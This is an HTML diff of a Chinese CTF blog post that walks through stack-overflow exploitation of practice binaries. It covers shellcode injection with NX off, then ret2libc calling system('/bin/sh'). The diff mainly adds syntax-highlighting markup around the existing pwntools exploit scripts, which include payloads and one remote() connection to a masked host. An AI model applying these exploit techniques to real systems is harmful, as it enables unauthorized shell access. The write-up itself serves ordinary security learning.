@@ -28,7 +28,7 @@
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -432,49 +432,62 @@
 <pre><code>  对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。</code></pre><p>解决方法：开启core dump功能。<br>指令：ulimit -c unlimited<br>   sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’</p>
 <p>开启后，当运行程序出现内存错误时，系统会生成一个core dump文件在tmp目录下。然后我们用gdb查看该core文件，来推测buf真正的地址。</p>
 <p><img src="https://s1.ax1x.com/2020/05/23/YvkRVe.png" alt=""><br>接下来调试core文件：<br><img src="https://s1.ax1x.com/2020/05/23/Yvk4PA.png" alt=""><br>下面这一步我不太明白为啥是$esp-144得到buf地址。个人觉得应该是-140，如果不正确可以扩大范围<br><img src="https://s1.ax1x.com/2020/05/23/Yvkf5d.png" alt=""><br>将这里的字符串和我们之前造的字符串对比是一致的。所以可以知道我们输入的字符串放在0xffffd000这里。所以buf地址就是0xffffd000.可以写exp了。</p>
-<pre><code>#level1
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#level1</span>
 
 
-sh = process(&quot;level1&quot;)
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level1"</span><span class="token punctuation">)</span>
 
-context(arch=&#39;i386&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;, word_size=32)
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span> word_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span>
 
-shellcode = asm(shellcraft.sh())
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 
-payload = shellcode + &quot;a&quot;*(140-len(shellcode)) + p32(0xffffcff0)
+payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffcff0</span><span class="token punctuation">)</span>
 
-#gdb.attach(sh)  ——这里启用的话可以进行调试。
+<span class="token comment" spellcheck="true">#gdb.attach(sh)  ——这里启用的话可以进行调试。</span>
 
-sh.sendline(payload)
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p>
 <h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p>
 <p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p>
 <h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p>
 <p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p>
-<pre><code>from pwn import*
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 
-#xctfpwn6 == rop level2
+<span class="token comment" spellcheck="true">#xctfpwn6 == rop level2</span>
 
-sh = process(&quot;level2&quot;)
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level2"</span><span class="token punctuation">)</span>
 
-systemaddr = 0xf7e19d10
-binshaddr = 0x804a024
-ret = 0x804a024   
+systemaddr <span class="token operator">=</span> <span class="token number">0xf7e19d10</span>
+binshaddr <span class="token operator">=</span> <span class="token number">0x804a024</span>
+ret <span class="token operator">=</span> <span class="token number">0x804a024</span>   
 
-#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system(&quot;/bin/sh&quot;)函数所以system的返回地址可任意。
+<span class="token comment" spellcheck="true">#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system("/bin/sh")函数所以system的返回地址可任意。</span>
 
-payload = &quot;a&quot;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>systemaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>
 
-sh.sendline(payload)
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-sh.interactive()</code></pre><p>连接到端口时脚本为：<br>from pwn import*</p>
-<p>context.log_level = ‘debug’  //虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。<br>elf = ELF(“level2”) // elf只是一个名字，level2是本地文件。<br>sysaddr = elf.symbols[‘system’] // .symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）<br><img src="https://s1.ax1x.com/2020/05/23/Yvkrgx.png" alt=""><br>binshaddr = elf.search(“/bin/sh”).next() // .search 找字符串，汇编代码或者某个数值的地址。</p>
-<p><img src="https://s1.ax1x.com/2020/05/23/Yvkw59.png" alt=""></p>
-<p>payload = “a”*140 + p32(sysaddr) + p32(0) + p32(binshaddr)</p>
-<p>sh = remote(“<strong>**</strong>“, port)</p>
-<p>sh.sendline(payload)</p>
-<p>sh.interactive()</p>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>连接到端口时脚本为：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token operator">//</span>虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>“level2"<span class="token punctuation">)</span> <span class="token operator">//</span> elf只是一个名字，level2是本地文件。
+sysaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">.</span>symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）
+!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkrgx<span class="token punctuation">.</span>png<span class="token punctuation">)</span>
+binshaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">.</span>search 找字符串，汇编代码或者某个数值的地址。
+
+!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkw59<span class="token punctuation">.</span>png<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>
+
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"******"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p>
 <p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>
 
@@ -827,7 +840,7 @@ from pwn import *
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
